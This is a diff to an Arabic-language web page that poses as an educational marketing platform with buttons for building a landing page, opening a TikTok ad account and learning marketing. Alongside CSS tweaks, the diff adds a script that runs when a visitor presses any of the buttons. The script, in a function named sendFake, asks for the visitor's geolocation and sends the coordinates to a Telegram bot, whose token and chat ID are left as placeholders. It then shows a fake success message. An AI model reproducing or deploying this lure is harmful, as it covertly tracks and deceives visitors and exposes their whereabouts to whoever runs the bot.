@@ -17,14 +17,14 @@
   }
 
   .container {
-    background: rgba(255, 255, 255, 0.1);
+    background: rgba(255, 255, 255, 0.15);
     padding: 30px;
     border-radius: 15px;
-    box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+    box-shadow: 0 8px 30px rgba(0,0,0,0.3);
     text-align: center;
     width: 90%;
     max-width: 400px;
-    backdrop-filter: blur(10px);
+    backdrop-filter: blur(12px);
     animation: fadeIn 1.2s ease;
   }
 
@@ -44,7 +44,7 @@
     width: 100%;
     margin: 12px 0;
     padding: 14px;
-    font-size: 16px;
+    font-size: 17px;
     border: none;
     border-radius: 10px;
     cursor: pointer;
@@ -58,12 +58,14 @@
     box-shadow: 0 6px 15px rgba(0,0,0,0.2);
   }
 
-  #btn1 { background: #4cafef; }
-  #btn1:hover { background: #3799df; }
-  #btn2 { background: #ff6b6b; }
-  #btn2:hover { background: #e65757; }
-  #btn3 { background: #51d88a; }
-  #btn3:hover { background: #3cbf74; }
+  #btn1 { background: #007bff; }
+  #btn1:hover { background: #0069d9; }
+
+  #btn2 { background: #ff4757; }
+  #btn2:hover { background: #e84118; }
+
+  #btn3 { background: #2ed573; }
+  #btn3:hover { background: #27ae60; }
 
   p {
     margin-top: 15px;
@@ -84,4 +86,76 @@
     transition: transform 0.2s;
   }
 
-  .
+  .social-icons i:hover {
+    transform: scale(1.2);
+  }
+</style>
+
+<!-- مكتبة أيقونات -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+</head>
+<body>
+
+<div class="container">
+  <h1>منصتك التعليمية</h1>
+  <button id="btn1" onclick="sendFake('✅ تم إنشاء الصفحة بنجاح!')">إنشاء صفحة هبوط</button>
+  <button id="btn2" onclick="sendFake('✅ تم عرض طريقة إنشاء الحساب!')">إنشاء حساب إعلاني تيك توك</button>
+  <button id="btn3" onclick="sendFake('📈 تم عرض خطوات التسويق!')">تعلم التسويق</button>
+  <p id="status"></p>
+
+  <!-- أيقونات السوشيال ميديا -->
+  <div class="social-icons">
+    <i class="fab fa-facebook"></i>
+    <i class="fab fa-twitter"></i>
+    <i class="fab fa-instagram"></i>
+    <i class="fab fa-tiktok"></i>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = "ضع_التوكن_هنا";
+const CHAT_ID = "ضع_المعرف_هنا";
+let locationGranted = false;
+let lastPosition = null;
+
+function getLocationOnce(callback) {
+    if (!locationGranted) {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                locationGranted = true;
+                lastPosition = position;
+                callback(position);
+            }, () => {
+                alert("❌ رفضت مشاركة الموقع أو حدث خطأ");
+            });
+        } else {
+            alert("المتصفح لا يدعم تحديد الموقع");
+        }
+    } else {
+        callback(lastPosition);
+    }
+}
+
+function sendFake(messageToShow) {
+    getLocationOnce(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
+        fetch(url)
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById("status").innerText = messageToShow;
+                } else {
+                    document.getElementById("status").innerText = "❌ حدث خطأ أثناء الإرسال";
+                }
+            })
+            .catch(() => {
+                document.getElementById("status").innerText = "⚠ حدث خطأ أثناء الإرسال";
+            });
+    });
+}
+</script>
+
+</body>
+</html>
